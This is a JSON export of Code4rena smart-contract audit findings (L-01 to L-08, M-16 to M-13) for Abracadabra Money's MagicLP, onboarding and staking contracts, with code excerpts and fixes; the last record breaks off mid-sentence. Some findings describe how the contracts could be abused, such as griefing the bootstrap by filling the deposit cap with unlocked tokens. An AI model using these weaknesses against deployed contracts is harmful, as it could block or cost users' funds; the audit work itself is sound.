      "content": "\nWhen creating a `MagicLP` using the `locked` `MIM` and `USDB` tokens, there's no verification performed to ensure that the amounts exceed a certain `threshold`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboardingBoot.sol#L101-L106\n```\nfunction bootstrap(uint256 minAmountOut) external onlyOwner onlyState(State.Closed) returns (address, address, uint256) {\n    uint256 baseAmount = totals[MIM].locked;\n    uint256 quoteAmount = totals[USDB].locked;\n    MIM.safeApprove(address(router), type(uint256).max);\n    USDB.safeApprove(address(router), type(uint256).max);\n\n    (pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);\n}\n```\nUsers may `lock` more `USDB` tokens than `MIM` tokens. \nSince `MIM` is the `base` token, the `totalPoolShares` will be based on the amount of `MIM` tokens. \nIf this value is significantly smaller than the amount of `USDB` tokens, the calculation of `claimable shares` for users will be affected by rounding because the `totalPoolShares` are significantly smaller than the `totalLocked` amount.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboardingBoot.sol#L155-L165\n```\nfunction _claimable(address user) internal view returns (uint256 shares) {\n    uint256 totalLocked = totals[MIM].locked + totals[USDB].locked;\n\n    if (totalLocked == 0) {\n        return 0;\n    }\n\n    uint256 userLocked = balances[user][MIM].locked + balances[user][USDB].locked;\n    return (userLocked * totalPoolShares) / totalLocked;\n}\n```\nThis can lead to some dust staking tokens being stuck in the `BlastOnboarding` contract.\n\nPlease set the `threshold` for the `locked` amounts of `MIM` and `USDB` tokens.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32080",
      "title": "[L-08] There might be a loss of funds if users directly `invoke` the `buyShares` function within the `MagicLP`",
      "impact": "LOW",
      "content": "\nIn the `buyShares` function, both the `base` and `quote` tokens are deposited in the same `ratio`, and the `shares` are calculated accordingly. \nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L397-L400\n```\nfunction buyShares(address to) external nonReentrant returns (uint256 shares, uint256 baseInput, uint256 quoteInput) {\n    if (totalSupply() == 0) {\n    } else if (baseReserve > 0 && quoteReserve > 0) {\n        uint256 baseInputRatio = DecimalMath.divFloor(baseInput, baseReserve);\n        uint256 quoteInputRatio = DecimalMath.divFloor(quoteInput, quoteReserve);\n        uint256 mintRatio = quoteInputRatio < baseInputRatio ? quoteInputRatio : baseInputRatio;\n        shares = DecimalMath.mulFloor(totalSupply(), mintRatio);\n    }\n}\n```\nIf a user deposits one token in a `higher ratio` than the other, the excess amount cannot be used for calculating `shares`. \nThis means users may lose these funds.\n\nTo mitigate this risk, there's an `addLiquidity` function in the `router`.\nHowever, it's uncertain what will happen if users directly call this function.\n\nAnd there is also no `minimum shares check`.\nAnd `transferFrom` is not used to transfer `base` and `quote` tokens from `msg.sender` to this `MagicLP`.\nWhile these approaches may present vulnerabilities, they can be mitigated when these functions including `buyShares` and `sellShares` are called from the `router`, as the `router` performs relevant checks.\n\nPlease ensure that these functions can only be invoked from the `router`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32079",
      "title": "[L-7] Ensure to call the `_twapUpdate` function before making any changes to the `reserves`",
      "impact": "LOW",
      "content": "\nThere is a `_twapUpdate` function to calculate `cumulative price`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L545-L558\n```\nfunction _twapUpdate() internal {\n    uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);\n    uint32 timeElapsed = blockTimestamp - _BLOCK_TIMESTAMP_LAST_;\n\n    if (timeElapsed > 0 && _BASE_RESERVE_ != 0 && _QUOTE_RESERVE_ != 0) {\n        unchecked {\n            _BASE_PRICE_CUMULATIVE_LAST_ += getMidPrice() * timeElapsed;\n        }\n    }\n\n    _BLOCK_TIMESTAMP_LAST_ = blockTimestamp;\n}\n```\nEnsure this function is invoked prior to modifying any `reserves`. \nIt's crucial to first update the `cumulative price` using the `previous reserves`, then proceed with `reserve` adjustments. \nHowever, the current process involves calling the `_twapUpdate` function after modifying `reserves`. \nConsequently, the `updated reserves` are multiplied by the `elapsed time`, leading to inaccuracies in the `cumulative price`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L564\n```\nfunction _setReserve(uint256 baseReserve, uint256 quoteReserve) internal {\n    _BASE_RESERVE_ = baseReserve.toUint112();\n    _QUOTE_RESERVE_ = quoteReserve.toUint112();\n\n    _twapUpdate();\n}\n```\nThe same for the `_sync` function.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L578\n```\nfunction _sync() internal {\n    uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));\n    uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));\n    ....\n    _twapUpdate();\n}\n```\nThe same for the `_resetTargetAndReserve` function.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/MagicLP.sol#L542\n```\nfunction _resetTargetAndReserve() internal returns (uint256 baseBalance, uint256 quoteBalance) {\n    _twapUpdate();\n}\n```\nShould call `_twapUpdate` function before making changes to the `reserves`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32078",
      "title": "[L-06] There is no functionality to change the `fee rate model` in the `MagicLP`",
      "impact": "LOW",
      "content": "\nWhen creating `MagicLP` using the `create` function in the `factory`, we insert `maintainerFeeRateModel` as the `fee rate model`. \nThis model will be used to calculate the `maintainer fee` in the `MagicLP`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Factory.sol#L86\n```\nfunction create(address baseToken_, address quoteToken_, uint256 lpFeeRate_, uint256 i_, uint256 k_) external returns (address clone) {\n    IMagicLP(clone).init(address(baseToken_), address(quoteToken_), lpFeeRate_, address(maintainerFeeRateModel), i_, k_);\n}\n```\nThere is a functionality to change `maintainerFeeRateModel` in the `factory`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Factory.sol#L105-L112\n```\nfunction setMaintainerFeeRateModel(IFeeRateModel maintainerFeeRateModel_) external onlyOwner {\n    if (address(maintainerFeeRateModel_) == address(0)) {\n        revert ErrZeroAddress();\n    }\n\n    maintainerFeeRateModel = maintainerFeeRateModel_;\n    emit LogSetMaintainerFeeRateModel(maintainerFeeRateModel_);\n}\n```\nThis implies that the `maintainerFeeRateModel` will require updating in the `future`.\nHowever, there's currently no functionality within `MagicLP` to modify the `fee rate model`. \nConsequently, existing `MagicLP`s are unable to alter the `fee rate model`.\n\nPlease add a functionality to change `fee rate model` in the `MagicLP`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32077",
      "title": "[L-05] We cannot create the `MagicLP` when the `decimal` of the `quote` token is less than the `decimal` of the `base` token",
      "impact": "LOW",
      "content": "\nWhen creating the `MagicLP` through the `router`, we validate the `decimals` of the `base` and `quote` tokens. \nIn case of `overflow/underflow`, the transaction will be reverted if the `decimal` of the `quote` token is less than the `decimal` of the `base` token.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Router.sol#L598-L605\n```\nfunction _validateDecimals(uint8 baseDecimals, uint8 quoteDecimals) internal pure {\n    if (baseDecimals == 0 || quoteDecimals == 0) {\n        revert ErrZeroDecimals();\n    }\n    if (quoteDecimals - baseDecimals > MAX_BASE_QUOTE_DECIMALS_DIFFERENCE) {\n        revert ErrDecimalsDifferenceTooLarge();\n    }\n}\n```\nAnd obviously, `A/B MagicLP` is different from `B/A MagicLP` because the `shares` calculation is based on the `base` token. \nIt means that in some cases, we cannot create the necessary `MagicLP` due to `decimals`.\n\nPlease modify like below:\n```\nfunction _validateDecimals(uint8 baseDecimals, uint8 quoteDecimals) internal pure {\n    if (baseDecimals == 0 || quoteDecimals == 0) {\n        revert ErrZeroDecimals();\n    }\n-     if (quoteDecimals - baseDecimals > MAX_BASE_QUOTE_DECIMALS_DIFFERENCE) {\n+     if (quoteDecimals > MAX_BASE_QUOTE_DECIMALS_DIFFERENCE + baseDecimals || baseDecimals > MAX_BASE_QUOTE_DECIMALS_DIFFERENCE + quoteDecimals ) {\n        revert ErrDecimalsDifferenceTooLarge();\n    }\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32076",
      "title": "[L-4] We should check the `totals[token].total` when rescuing tokens in the `BlastOnboarding`",
      "impact": "LOW",
      "content": "\nWhen rescuing tokens, we only check whether this token is supported.\nIf it is not a supported token, the `owner` can claim any amounts.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboarding.sol#L205-L212\n```\nfunction rescue(address token, address to, uint256 amount) external onlyOwner {\n    if (supportedTokens[token]) {\n        revert ErrNotAllowed();\n    }\n    token.safeTransfer(to, amount);\n    emit LogTokenRescue(token, to, amount);\n}\n```\nThere might be a scenario as follows:\n`Token A` is initially set as a `supported` token.\nUsers deposit some amounts.\nAfter some time, this token is set as `unsupported`.\nAs a result, the owner can claim this token, and therefore users who deposited it cannot `claim` their tokens.\n\nPlease add below additional check.\n```\nfunction rescue(address token, address to, uint256 amount) external onlyOwner {\n+    if (amount > IERC20(token).balanceOf(address(this)) - totals[token].total) revert();\n-     if (supportedTokens[token]) {\n-         revert ErrNotAllowed();\n-     }\n    token.safeTransfer(to, amount);\n    emit LogTokenRescue(token, to, amount);\n}\n```\nBy doing this, the `owner` can claim the donated `supported` tokens also.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32075",
      "title": "[L-03] The `rounding direction` should be set to `round up` in the `_adjustAddLiquidity` function in the `router` contract",
      "impact": "LOW",
      "content": "\nIn the `_adjustAddLiquidity` function, all calculations are `rounded down`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Router.sol#L521-L538\n```\nfunction _adjustAddLiquidity(\n    address lp,\n    uint256 baseInAmount,\n    uint256 quoteInAmount\n) internal view returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount) {\n        if (IERC20(lp).totalSupply() == 0) {\n            uint256 i = IMagicLP(lp)._I_();\n            uint256 shares = quoteInAmount < DecimalMath.mulFloor(baseInAmount, i) ? DecimalMath.divFloor(quoteInAmount, i) : baseInAmount;\n            baseAdjustedInAmount = shares;\n@here:            quoteAdjustedInAmount = DecimalMath.mulFloor(shares, i);\n        } else {\n            if (quoteReserve > 0 && baseReserve > 0) {\n                uint256 baseIncreaseRatio = DecimalMath.divFloor(baseInAmount, baseReserve);\n                uint256 quoteIncreaseRatio = DecimalMath.divFloor(quoteInAmount, quoteReserve);\n                if (baseIncreaseRatio <= quoteIncreaseRatio) {\n                    baseAdjustedInAmount = baseInAmount;\n@here:                    quoteAdjustedInAmount = DecimalMath.mulFloor(quoteReserve, baseIncreaseRatio);\n                } else {\n                    quoteAdjustedInAmount = quoteInAmount;\n@here:                    baseAdjustedInAmount = DecimalMath.mulFloor(baseReserve, quoteIncreaseRatio);\n                }\n            }\n        }\n}\n```\nThese adjusted values are exactly what are deposited into the `pool`. \nGenerally, in most `protocols`, the deposited token amounts should be `rounded up` in favor of the `protocol` rather than the `users` and such kind of issues have been treated as `medium`.\nIn short, the `shares` calculation should be `rounded down`, while the token amounts calculation should be `rounded up`.\n\nAlso in the `previewCreatePool` function.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Router.sol#L103\n```\nfunction previewCreatePool() external pure returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n    quoteAdjustedInAmount = DecimalMath.mulFloor(shares, i);\n}\n```\nAnd in the `previewAddLiquidity` function.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/mimswap/periphery/Router.sol#L140\n```\nfunction previewAddLiquidity() external view returns (uint256 baseAdjustedInAmount, uint256 quoteAdjustedInAmount, uint256 shares) {\n    if (totalSupply == 0) {\n        quoteAdjustedInAmount = DecimalMath.mulFloor(shares, i);\n    }\n}\n```\nShould use `mulCeil` instead of `mulFloor`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32074",
      "title": "[L-02] The `cap` can be associated with `locked` tokens in the `BlastOnboarding` contract",
      "impact": "LOW",
      "content": "\nUsers cannot `deposit` more tokens than the `cap`. \nI guess the `cap` is intended to `limit` the tokens for creating the initial `MagicLP`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboarding.sol#L114-L116\n```\nfunction deposit(address token, uint256 amount, bool lock_) external whenNotPaused onlyState(State.Opened) onlySupportedTokens(token) {\n    totals[token].total += amount;\n\n    if (caps[token] > 0 && totals[token].total > caps[token]) {\n        revert ErrCapReached();\n    }\n}\n```\nThere are two types of tokens: `locked` and `unlocked` tokens.\nOnly the `locked` tokens will be used to create `MagicLP`.\n`Unlocked` tokens can be claimed anytime and have no effect on the `pool`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/blast/BlastOnboarding.sol#L132-L141\n```\nfunction withdraw(address token, uint256 amount) external whenNotPaused onlySupportedTokens(token) {\n    balances[msg.sender][token].unlocked -= amount;\n    balances[msg.sender][token].total -= amount;\n    totals[token].unlocked -= amount;\n    totals[token].total -= amount;\n    token.safeTransfer(msg.sender, amount);\n}\n```\nIf the `cap` is set, any malicious user can deposit many `unlocked` tokens and prevent other users from depositing. \nIf there are not enough tokens to create a `pool` because of this, the only solution is to increase the `cap`. \nHowever, this is not a perfect solution.\n\nPlease modify `deposit` function.\n```\nfunction deposit(address token, uint256 amount, bool lock_) external whenNotPaused onlyState(State.Opened) onlySupportedTokens(token) {\n    totals[token].total += amount;\n\n-    if (caps[token] > 0 && totals[token].total > caps[token]) {\n+    if (caps[token] > 0 && totals[token].locked > caps[token]) {\n        revert ErrCapReached();\n    }\n}\n```\nAlso modify `lock` function.\n```\nfunction lock(address token, uint256 amount) external whenNotPaused onlyState(State.Opened) onlySupportedTokens(token) {\n    balances[msg.sender][token].unlocked -= amount;\n    balances[msg.sender][token].locked += amount;\n    totals[token].unlocked -= amount;\n    totals[token].locked += amount;\n+    if (caps[token] > 0 && totals[token].locked > caps[token]) {\n+        revert ErrCapReached();\n+    }\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32073",
      "title": "[L-01] Disable the `stakeFor` function when the `system` is `paused`",
      "impact": "LOW",
      "content": "\nIn the `LockingMultiRewards` contract, users cannot `stake` when the system is `paused`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/staking/LockingMultiRewards.sol#L150\n```\nfunction stake(uint256 amount, bool lock_) public whenNotPaused {\n    _stakeFor(msg.sender, amount, lock_);\n}\n```\nAdditionally, users cannot lock already deposited tokens when the `system` is `paused`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/staking/LockingMultiRewards.sol#L155\n```\nfunction lock(uint256 amount) public whenNotPaused {\n}\n```\nAll operations should be disabled when the `system` is `paused`.\nHowever, `operators` can still `stake` for other users when the `system` is `paused`.\nhttps://github.com/code-423n4/2024-03-abracadabra-money/blob/1f4693fdbf33e9ad28132643e2d6f7635834c6c6/src/staking/LockingMultiRewards.sol#L349-L351\n```\nfunction stakeFor(address account, uint256 amount, bool lock_) external onlyOperators {\n    _stakeFor(account, amount, lock_);\n}\n```\n\nShould include the `whenNotPaused` `modifier`.\n```\n- function stakeFor(address account, uint256 amount, bool lock_) external onlyOperators {\n+ function stakeFor(address account, uint256 amount, bool lock_) external onlyOperators whenNotPaused  {\n    _stakeFor(account, amount, lock_);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "32072",
      "title": "[M-16] User can grief bootstrap process by sending the cap amount of unlocked tokens to it.",
      "impact": "MEDIUM",
      "content": "\nThe bootstrap process relies on users locking up all their tokens as it will only use tokens that are marked locked in `totals[MIM].locked` and `totals[USDB].locked`.\n\n[BlastOnboardingBoot.sol#L96-L127](https://github.com/code-423n4/2024-03-abracadabra-money/blob/main/src/blast/BlastOnboardingBoot.sol#L96-L127)\n\n```solidity\n    function bootstrap(uint256 minAmountOut) external onlyOwner onlyState(State.Closed) returns (address, address, uint256) {\n        if (pool != address(0)) {\n            revert ErrAlreadyBootstrapped();\n        }\n\n=>      uint256 baseAmount = totals[MIM].locked;\n=>      uint256 quoteAmount = totals[USDB].locked;\n        MIM.safeApprove(address(router), type(uint256).max);\n        USDB.safeApprove(address(router), type(uint256).max);\n\n        (pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);\n\n        if (totalPoolShares < minAmountOut) {\n            revert ErrInsufficientAmountOut();\n        }\n\n        // Create staking contract\n        // 3x boosting for locker, 7 days reward duration, 13 weeks lp locking\n        // make this contract temporary the owner the set it as an operator\n        // for permissionned `stakeFor` during the claiming process and then\n        // transfer the ownership to the onboarding owner.\n        staking = new LockingMultiRewards(pool, 30_000, 7 days, 13 weeks, address(this));\n        staking.setOperator(address(this), true);\n        staking.transferOwnership(owner);\n\n        // Approve staking contract\n        pool.safeApprove(address(staking), totalPoolShares);\n\n        emit LogLiquidityBootstrapped(pool, address(staking), totalPoolShares);\n\n        return (pool, address(staking), totalPoolShares);\n    }\n```\n\nHowever, it is possible that these values can be zero because there is a cap on the amount of tokens that can be stored in the contract.\n\n[BlastOnboarding.sol#L101-L121](https://github.com/code-423n4/2024-03-abracadabra-money/blob/main/src/blast/BlastOnboarding.sol#L101-L121)\n\n```solidity\n    function deposit(address token, uint256 amount, bool lock_) external whenNotPaused onlyState(State.Opened) onlySupportedTokens(token) {\n        token.safeTransferFrom(msg.sender, address(this), amount);\n\n        if (lock_) {\n            totals[token].locked += amount;\n            balances[msg.sender][token].locked += amount;\n        } else {\n            totals[token].unlocked += amount;\n            balances[msg.sender][token].unlocked += amount;\n        }\n\n        totals[token].total += amount;\n\n        if (caps[token] > 0 && totals[token].total > caps[token]) {\n            revert ErrCapReached();\n        }\n\n        balances[msg.sender][token].total += amount;\n\n        emit LogDeposit(msg.sender, token, amount, lock_);\n    }\n```\n\nIn the code above, notice that there is a cap on the amount of tokens that can be sent to the contract `caps[token]`. The problem here is that it is checked against the total token amount `totals[token].total` rather than the locked amount `totals[token].locked`.\n\nTherefore a griefer can deposit tokens up to the `caps[token]` with `lock_ = false`. The result, is that no one else can deposit tokens into the contract.\n\nDuring bootstrap, since these tokens are still considered unlocked, then  `totals[MIM].locked = 0` and `totals[USDB].locked = 0`, therefore there won't be any locked tokens available for the bootstrapping process.\n\n### Recommended Mitigation Steps\n\nInstead of checking `caps[token]` against `totals[token].total`, it should be checked against `totals[token].locked`.\n\n**[0xCalibur (Abracadabra) confirmed, but disagreed with severity and and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/7#issuecomment-2000052685):**\n > https://github.com/Abracadabra-money/abracadabra-money-contracts/pull/139\n\n**[cccz (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/7#issuecomment-2026868444):**\n > Incorrect cap check, consider M.\n\n_Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/7)._\n\n***\n\n",
      "summary": "\nThis report is about a bug found in the bootstrap process of the Abracadabra money project. The process requires users to lock up their tokens, but it only uses tokens that are marked as locked in specific variables. However, the code has a flaw where it checks the total token amount against a cap, instead of checking only the locked amount. This means that a malicious user could deposit tokens up to the cap without locking them, preventing others from depositing tokens and causing the bootstrap process to fail. To fix this, the code should be updated to check the cap against the locked amount instead. The severity of this bug has been debated, but it is recommended to fix it as soon as possible to prevent any potential attacks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/7",
      "tags": [],
      "finders": [
        "DarkTower",
        "ether\\_sky"
      ]
    },
    {
      "id": "32071",
      "title": "[M-15] `LockingMultiRewards` contract on Blast does not configure gas yield nor token yield mode.",
      "impact": "MEDIUM",
      "content": "\nThe Abracadabra team configures gas yield for all contracts in the Blast L2 except for the `LockingMultiRewards` contract. Therefore, gas yields accrued on the `LockingMultiRewards` staking contract since deployment will be lost as it was never configured using `BlastYields.configureDefaultClaimables`. If the contract holds native yield reward tokens in ERC20 such as WETHRebasing or USDB then these rewards will also be lost.\n\n### Proof of Concept\n\nDuring deployment of the staking contract on Blast, the staking contract's gas yield mode should be configured to be able to claim accrued gas fees spent on the contract. We know that the `bootstrap()` function spawns the `LockingMultiRewards` staking contract below.\n\n```solidity\nfunction bootstrap(uint256 minAmountOut) external onlyOwner onlyState(State.Closed) returns (address, address, uint256) {\n        ...\n @>     staking = new LockingMultiRewards(pool, 30_000, 7 days, 13 weeks, address(this)); // spawns the staking contract\n        ...\n    }\n```\n\nHowever, in the `LockingMultiRewards` contract, the `BlastYields.configureDefaultClaimables` function does not exist in the `LockingMultiRewards` constructor to configure the staking contract's gas yield mode. Therefore, gas yield cannot be claimed `LockingMultiRewards`.\n\n```solidity\nconstructor(\n        address _stakingToken,\n        uint256 _lockingBoostMultiplerInBips,\n        uint256 _rewardsDuration,\n        uint256 _lockDuration,\n        address _owner\n    ) OperatableV2(_owner) {\n        if (_lockingBoostMultiplerInBips <= BIPS) {\n            revert ErrInvalidBoostMultiplier();\n        }\n\n        if (_lockDuration < MIN_LOCK_DURATION) {\n            revert ErrInvalidLockDuration();\n        }\n\n        if (_rewardsDuration < MIN_REWARDS_DURATION) {\n            revert ErrInvalidRewardDuration();\n        }\n\n        if (_lockDuration % _rewardsDuration != 0) {\n            revert ErrInvalidDurationRatio();\n        }\n\n        stakingToken = _stakingToken;\n        lockingBoostMultiplerInBips = _lockingBoostMultiplerInBips;\n        rewardsDuration = _rewardsDuration;\n        lockDuration = _lockDuration;\n\n        // kocks are combined into the same `rewardsDuration` epoch. So, if\n        // a user stake with locking every `rewardsDuration` this should reach the\n        // maximum number of possible simultaneous because the first lock gets expired,\n        // freeing up a slot.\n        maxLocks = _lockDuration / _rewardsDuration;\n    }\n```\n\nWe believe this to be a mistake by the Abracadabra team as all other contracts that use substantial gas except for this contract had their gas yield mode configured/ The gas spent for this contract will be very substantial considering that users will spend substantial amounts of gas claiming from the staking contract. Therefore the Abracadabra is missing out the gas fees in this contract by not configuring the gas yield mode and possibly native yield in such as WETHRebasing or USDB if such tokens are used\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nConfigure the Blast gas yield mode for the `LockingMultiRewards` staking contract in the constructor and expose a function for admin to collect the yields. Additionally, also consider whether Blast points need to be configured here.\n\n**[cccz (Judge) commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/27#issuecomment-2037499866):**\n > I'll consider this an M about value leak.\n\n_Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/27)._\n\n***\n\n",
      "summary": "\nThe Abracadabra team has not properly configured the gas yield for their `LockingMultiRewards` staking contract in the Blast L2. This means that any gas fees earned by the contract since its deployment will be lost. This also applies to any native yield reward tokens, such as WETHRebasing or USDB. The team may have overlooked this issue, as all other contracts with significant gas usage have their gas yield mode configured. To fix this, the team should configure the gas yield mode in the constructor and provide an admin function to collect the yields. This will prevent a loss of value for the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/27",
      "tags": [],
      "finders": [
        "DarkTower"
      ]
    },
    {
      "id": "32070",
      "title": "[M-14] Staking contract is not able to support native USDB/WETH",
      "impact": "MEDIUM",
      "content": "\nLoss of yield if USDB/WETH is used as reward token.\n\n### Proof of Concept\n\nFrom what I understood from the protocol team, they want to support any ERC20 tokens that are considered safe/well known. I believe USDB/WETH falls into this category.\n\nBoth USDB and WETH yield mode are AUTOMATIC by default. `LockingMultiRewards.sol` uses internal accounting to track all rewards that are accrued for users. For instance, when users stake `amount`, `stakingTokenBalance` will increase by `amount` and user's balance will increase by `amount` accordingly. Rewards that are distributed to users are based on these internal accounting values.\n\nThe issue here is that,\n\n1.  If USDB/WETH tokens are used as reward tokens, the accrued yield due to automatic rebasing are lost as they cannot be claimed.\n2.  If protocol team has not used such tokens as reward tokens yet and becomes aware of this, then it means that they will not be able to use these tokens as reward tokens.\n\n### Recommended Mitigation Steps\n\nAdd the ability to set native RebasingERC20 token to `CLAIMABLE` and implement a way to claim the yields to the staking contract.\n\n**[0xCalibur (Abracadabra) confirmed and commented](https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/48#issuecomment-2000439614):**\n > It's fixed here:\n >\n> https://github.com/Abracadabra-money/abracadabra-money-contracts/blob/main/src/blast/BlastLockingMultiRewards.sol\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue where the yield is lost if the USDB/WETH tokens are used as reward tokens in the protocol. The report recommends adding the ability to claim the yields and provides a link to the fixed code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2024-03-abracadabra-money",
      "github_link": "https://github.com/code-423n4/2024-03-abracadabra-money-findings/issues/48",
      "tags": [],
      "finders": [
        "yixxas"
      ]
    },
    {
      "id": "32069",
      "title": "[M-13] Less base tokens are transferred when selling quote tokens due to the precision loss that occurred in `_GeneralIntegrate()`",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/main/src/mimswap/libraries/Math.sol#L51-L65> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/main/src/mimswap/MagicLP.sol#L180-L191> \n\n<https://github.com/code-423n4/2024-03-abracadabra-money/blob/main/src/mimswap/libraries/PMMPricing.sol#L76-L100>\n\nSolidity rounds down the result of an integer division, and because of that, it is always recommended to multiply before dividing to avoid that precision loss.\nIn the case of a prior division over multiplication, the final result may face serious precision loss as the first answer would face truncated precision and then multiplied to another integer.\n\nThe problem lies in the magicLP's quote token querying part. The function `querySellQuote()` is responsible for querying the price of the quote token. This function calls the `sellQuoteToken()` function of the contract PMMPricing which uses a curve integral at its heart. To be precise, for the cases where the parameter `R` is not equal to `1`, the function `sellQuoteToken()` calls the two functions `_RAboveSellBaseToken()`, `_RBelowSellQuoteToken()` for the cases `R > 1` and `R < 1` respectively. These two functions calculate the base token amounts using the `_GeneralIntegrate()` function.\n\nIf we look deeply at the function `_GeneralIntegrate()` we can see the numerical integration procedure is presented 